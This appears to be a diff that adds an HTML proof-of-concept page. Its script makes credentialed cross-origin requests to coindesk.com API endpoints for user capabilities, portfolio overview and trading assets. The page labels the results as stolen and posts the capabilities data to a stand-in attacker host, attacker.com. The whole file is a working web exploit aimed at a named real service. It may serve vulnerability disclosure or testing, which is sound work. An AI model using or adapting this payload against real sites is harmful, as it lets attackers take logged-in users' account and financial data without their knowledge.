@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+// Attack 1: Steal user capabilities/permissions
+fetch('https://www.coindesk.com/api/v1/user/capabilities', {
+  method: 'GET',
+  credentials: 'include',
+  headers: {
+    'Content-Type': 'application/json'
+  }
+})
+.then(response => response.json())
+.then(data => {
+  console.log('STOLEN USER CAPABILITIES:', data);
+  // Send to attacker server
+  fetch('https://attacker.com/log', {
+    method: 'POST',
+    body: JSON.stringify({type: 'capabilities', data: data})
+  });
+});
+
+// Attack 2: Steal portfolio data
+fetch('https://www.coindesk.com/api/v4/portfolio/overview?tradingAccountId=1', {
+  credentials: 'include'
+})
+.then(r => r.json())
+.then(portfolio => {
+  console.log('STOLEN PORTFOLIO:', portfolio);
+});
+
+// Attack 3: Access trading assets
+fetch('https://www.coindesk.com/trading-api/v1/assets?marketType=SPOT', {
+  credentials: 'include'
+})
+.then(r => r.json())
+.then(assets => {
+  console.log('TRADING ASSETS:', assets);
+});
+</script>
+</body>
+</html>
